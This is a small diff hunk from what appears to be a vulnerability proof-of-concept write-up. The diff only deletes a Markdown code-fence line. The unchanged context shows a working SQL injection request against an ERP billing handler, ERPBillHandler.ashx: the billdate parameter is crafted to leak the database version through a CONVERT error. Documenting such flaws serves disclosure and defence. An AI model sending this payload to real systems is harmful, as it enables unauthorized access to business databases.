@@ -31,7 +31,7 @@ Successful exploitation leads to:
 
 Send the following HTTP request:
 
-```http
+
 GET /APIHandler/ERPBillHandler.ashx?action=search&billdate='+AND+1=CONVERT(int,+@@VERSION)+AND+'1'='1 HTTP/1.1
 Host: [target]
 Cookie: ASP.NET_SessionId=[any_value]
